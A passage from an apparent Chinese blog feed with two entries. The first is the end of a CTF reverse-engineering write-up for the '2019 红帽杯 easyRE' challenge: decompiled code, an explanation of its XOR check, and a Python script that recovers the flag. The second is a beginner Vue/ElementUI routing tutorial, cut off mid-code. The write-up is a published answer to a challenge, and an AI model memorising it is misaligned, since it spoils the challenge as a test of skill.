<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_400D35</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br></span>&#123;<br>  __int64 v2; <span class="hljs-comment">// rdi</span><br>  __int64 result; <span class="hljs-comment">// rax</span><br>  unsigned __int64 v4; <span class="hljs-comment">// rt1</span><br>  unsigned <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [rsp+Ch] [rbp-24h]</span><br>  signed <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  signed <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// [rsp+14h] [rbp-1Ch]</span><br>  unsigned <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>  unsigned __int64 v9; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v2 = <span class="hljs-number">0L</span>L;<br>  v5 = sub_43FD20(<span class="hljs-number">0L</span>L) - qword_6CEE38;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1233</span>; ++i )<br>  &#123;<br>    v2 = v5;<br>    sub_40F790(v5);<br>    sub_40FE60();<br>    sub_40FE60();<br>    v5 = (unsigned __int64)sub_40FE60() ^ <span class="hljs-number">0x98765432</span>;<br>  &#125;<br>  v8 = v5;<br>  <span class="hljs-keyword">if</span> ( ((unsigned __int8)v5 ^ byte_6CC0A0[<span class="hljs-number">0</span>]) == <span class="hljs-number">102</span> &amp;&amp; (HIBYTE(v8) ^ (unsigned __int8)byte_6CC0A3) == <span class="hljs-number">103</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">24</span>; ++j )<br>    &#123;<br>      v2 = (unsigned __int8)(byte_6CC0A0[j] ^ *((_BYTE *)&amp;v8 + j % <span class="hljs-number">4</span>));<br>      sub_410E90(v2);<br>    &#125;<br>  &#125;<br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  result = v4 ^ v9;<br>  <span class="hljs-keyword">if</span> ( v4 != v9 )<br>    sub_444020(v2, a2);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>找到涉及到这段数据的代码:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">v8 = v5;<br><span class="hljs-keyword">if</span> ( ((unsigned __int8)v5 ^ byte_6CC0A0[<span class="hljs-number">0</span>]) == <span class="hljs-string">'f'</span> &amp;&amp; (HIBYTE(v8) ^ (unsigned __int8)byte_6CC0A3) == <span class="hljs-string">'g'</span> )<br>&#123;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">24</span>; ++j )<br>  &#123;<br>    v2 = (unsigned __int8)(byte_6CC0A0[j] ^ *((_BYTE *)&amp;v8 + j % <span class="hljs-number">4</span>));<br>    sub_410E90(v2);<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>v5赋值给v8，所以这里v5和v8是一样的。<br>这里解释一下，HIBYTE()是什么意思，HIBYTE()函数的作用是获取高字节也就是数组的最后一位()，同时还有BYTE()、BYTE1()、BYTE2()第一个是获取数组的第一位，第二个就是获取第二位，依次类推。</p>
<p>所以这里的 <code>HIBYTE(v8)</code> 其实就是int型v5的第七八位的十六进制，也就是一个字符十六进制，需要等于 ‘g’<br>这里的第一二位需要等于 ‘f’, 所以我猜测就是前四个字符是 ‘flag’</p>
<p>分析到这里，大概基本上就出来了，for循环是不断将 <code>byte_6CC0A0</code> 数组，与v8的前四个(j%4)字符进行异或，v8前四个能够通过 <code>flag</code> 来逆出来。</p>
<h2 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h2><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">s = [0x40, 0x35, 0x20, 0x56]<br>flag_Demo = 'flag'<br>a = ''<br><br>for i in range(4):<br>    a += chr(s[i] ^ ord(flag_Demo[i]))<br>    # print(ord(flag_Demo[i]))<br>print(a)<br><br>b = [0x40,0x35,0x20,0x56,0x5D,0x18,0x22,0x45,0x17,0x2F,0x24,0x6E,0x62,0x3C,0x27,0x54,0x48,0x6C,0x24,0x6E,0x72,0x3C,0x32,0x45,0x5B]<br><br>flag = ''<br><br>for i in range(len(b)):<br>    flag += chr(b[i] ^ ord(a[i%4]))<br>print(flag)<br></code></pre></div></td></tr></table></figure>



<p>===============================<br>参考文章：<br>  <a href="https://blog.csdn.net/mishixiaodai/article/details/109747660" target="_blank" rel="noopener"> 2019 红帽杯 easyRE</a></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue:实战快速上手</title>
    <url>/article/e1cd8041.html</url>
    <content><![CDATA[<font color="#856363" size="4" face="Open Sans">

<p class="note note-success">创建工程</p>

<p>注意：命令行都要使用管理员模式运行</p>
<p>1、 创建一个名叫 VueElementUI 的工程 <code>vue init webpack VueElementUI</code></p>
<p>2、安装依赖，我们需要安装 vue-router、elementUI、sass-loader 和 node-sass 四个插件</p>
<figure class="highlight cmd"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmd"># 进入工程目录<br><span class="hljs-built_in">cd</span> VueElementUI<br># 安装 vue-router<br>npm install vue-router --save-dev<br># 安装 element-ui -S<br>npm i element-ui -S<br># 安装依赖<br>npm install<br># 安装 SASS 加载器<br>cnpm install sass-loader node-sass --save-dev<br># 启动测试<br>npm run dev<br></code></pre></div></td></tr></table></figure>

<p>3、Npm命名解释：</p>
<li><font color="#FFB6C1" size="3" face="Open Sans">npm install moduleName</font> : 安装模块到项目目录下</li>
<li><font color="#FFB6C1" size="3" face="Open Sans">npm install -g moduleName</font> : -g 的意思就是将模块安装到全局，具体安装到磁盘哪个位置，要看 npm config prefix 的位置</li>
<li><font color="#FFB6C1" size="3" face="Open Sans">npm install --save moduleName</font> : -save 的意思就是将模块安装到项目目录下，并在 package 文件的 dependencies 节点写入依赖，-S 为该命令的缩写</li>
<li><font color="#FFB6C1" size="3" face="Open Sans">npm install --save-dev moduleName</font> : --save-dev 的意思是将模块安装到项目目录下，并在 package 文件的 devDependencies 节点写入依赖，-D 为该命令的缩写</li>

<br>
<br>
<p class="note note-success">创建登录页面</p>

<p>   把没有用的初始化东西删掉!<br>   把源码目录中创建如下结构：<br>   <li><font color="#4682B4" size="3" face="Open Sans">assets：用于存放资源文件</font></li><br>   <li><font color="#4682B4" size="3" face="Open Sans">components：用于存放Vue功能组件</font></li><br>   <li><font color="#4682B4" size="3" face="Open Sans">views：用于存放Vue试图组件</font></li><br>   <li><font color="#4682B4" size="3" face="Open Sans">router：用于存放vue-router配置</font></li></p>
<p><img src="https://qiniuyun.fxhstudy.com/Vue-%E5%AE%9E%E6%88%98%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B1.png" srcset="/img/loading.gif"><br></p>
<p><b>创建首页视图，在 views 目录下创建一个名为 Main.vue 的视图组件：</b><br></p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">"Main"</span><br>&#125;<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>在router文件下创建index.js路由配置文件</p>
<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span><br><span class="hljs-keyword">import</span> Router <span class="hljs-keyword">from</span> <span class="hljs-string">"vue-router"</span><br><br><span class="hljs-keyword">import</span> login <span class="hljs-keyword">from</span> <span class="hljs-string">"../views/Login"</span><br><span class="hljs-keyword">import</span> main <span class="hljs-keyword">from</span> <span class="hljs-string">"../views/Main"</span><br><br>Vue.use(Router);<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> Router(&#123;<br>  <span class="hljs-attr">routes</span>: [<br>    &#123;<br>      <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,<br>      <span class="hljs-attr">component</span>: login<br>    &#125;,<br>    &#123;<br>      <span class="hljs-attr">path</span>: <span class="hljs-string">'/main'</span>,<br>      <span class="hljs-attr">component</span>: main<br>    &#125;<br>  ]<br>&#125;)<br></code></pre></div></td></tr></table></figure>

<p>配置main.js</p>
<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;<br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">"./App"</span>;<br><br><span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">"./router"</span><br><br><span class="hljs-keyword">import</span> ElementUI <span class="hljs-keyword">from</span> <span class="hljs-string">'element-ui'</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-string">'element-ui/lib/theme-chalk/index.css'</span>;<br><br>Vue.use(router);<br>Vue.use(ElementUI);<br><br><span class="hljs-keyword">new</span> Vue(&#123;<br>  <span class="hljs-attr">el</span>: <span class="hljs-string">"#app"</span>,<br>  router,<br>  <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> h(App) <span class="hljs-comment">//ElementUI</span><br>&#125;)<br><span class="hljs-string">`</span><br></code></pre></div></td></tr></table></figure>

<p>App.vue</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/main"</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/login"</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">router-view</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><br><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">'App'</span><br>&#125;<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>运行  <font color="#4682B4" size="3" face="Open Sans">npm run dev</font>  ,成功页面</p>
<p><img src="https://qiniuyun.fxhstudy.com/Vue-%E5%AE%9E%E6%88%98%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B3.png" srcset="/img/loading.gif"><br></p>
<p><br><br></p>
<p class="note note-success">路由嵌套</p>
    嵌套路由又称为子路由，在实际应用中，通常由多层嵌套的组件组合而成。同样的，URL中各段动态路径也按某种结构对应嵌套的各层组件，例：

<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">/user/foo/Profile						/user/foo/posts<br>+--------------------+					+--------------------+<br>|  User				 |					|  User				 |<br>|  +---------------+ |					|  +---------------+ |<br>|  | Profile	   | |	+-------------&gt; |  | Posts  	   | |<br>|  |			   | |					|  |			   | |<br>|  +---------------+ |					|  +---------------+ |<br>+--------------------+					+--------------------+<br></code></pre></div></td></tr></table></figure>

<p>   1、用户信息组件，在 views/user 目录下创建一个名为 Profile.vue 的视图组件;</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>个人信息<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">"UserProfile"</span><br>&#125;<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>   2、用户列表组件在 views/user 目录下创建一个名为 List.vue 的视图组件;</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>用户列表<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">"UserList"</span><br>&#125;<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>   3、配置嵌套路由修改 router 目录下的 index.js 路由配置文件，代码如:</p>
<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span><br><span class="hljs-keyword">import</span> Router <span class="hljs-keyword">from</span> <span class="hljs-string">"vue-router"</span><br><br><span class="hljs-keyword">import</span> login <span class="hljs-keyword">from</span> <span class="hljs-string">"../views/Login"</span><br><span class="hljs-keyword">import</span> main <span class="hljs-keyword">from</span> <span class="hljs-string">"../views/Main"</span><br><br><span class="hljs-keyword">import</span> UserProfile <span class="hljs-keyword">from</span> <span class="hljs-string">"../views/user/Profile"</span><br><span class="hljs-keyword">import</span> UserList <span class="hljs-keyword">from</span> <span class="hljs-string">"../views/user/List"</span><br><br>Vue.use(Router);<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> Router(&#123;<br>  <span class="hljs-attr">routes</span>: [<br>    &#123;<br>      <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,<br>      <span class="hljs-attr">component</span>: login<br>    &#125;,<br>    &#123;<br>      <span class="hljs-attr">path</span>: <span class="hljs-string">'/main'</span>,<br>      <span class="hljs-attr">component</span>: main,<br>      <span class="hljs-attr">children</span>: [   <span class="hljs-comment">//路由嵌套</span><br>        &#123;<span class="hljs-attr">path</span>: <span class="hljs-string">'/user/profile'</span>, <span class="hljs-attr">component</span>: UserProfile&#125;,<br>        &#123;<span class="hljs-attr">path</span>: <span class="hljs-string">'/user/list'</span>, <span class="hljs-attr">component</span>: UserList&#125;<br>      ]<br>    &#125;<br>  ]<br>&#125;)<br></code></pre></div></td></tr></table></figure>

<p>   4、修改首页视图，我们修改 Main.vue 视图组件，此处使用了 ElementUI 布局容器组件，代码如下</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">el-container</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">el-aside</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200px"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">el-menu</span> <span class="hljs-attr">:default-openeds</span>=<span class="hljs-string">"['1']"</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">el-submenu</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"1"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">"title"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"el-icon-caret-right"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>用户管理<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item-group</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"1-1"</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--插入的地方--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/user/profile"</span>&gt;</span>个人信息<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><br>              <span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"1-2"</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--插入的地方--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/user/list"</span>&gt;</span>用户列表<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><br>              <span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item-group</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">el-submenu</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">el-submenu</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"2"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">"title"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"el-icon-caret-right"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>内容管理<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item-group</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"2-1"</span>&gt;</span>分类管理<span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"2-2"</span>&gt;</span>内容列表<span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item-group</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">el-submenu</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">el-menu</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">el-aside</span>&gt;</span><br><br>      <span class="hljs-tag">&lt;<span class="hljs-name">el-container</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">el-header</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: right; font-size: 12px"</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"el-icon-setting"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"margin-right: 15px"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown-menu</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">"dropdown"</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown-item</span>&gt;</span>个人信息<span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown-item</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown-item</span>&gt;</span>退出登录<span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown-item</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown-menu</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">el-header</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">el-main</span>&gt;</span><br>          <span class="hljs-comment">&lt;!--在这里展示视图--&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">el-main</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">el-container</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">el-container</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span 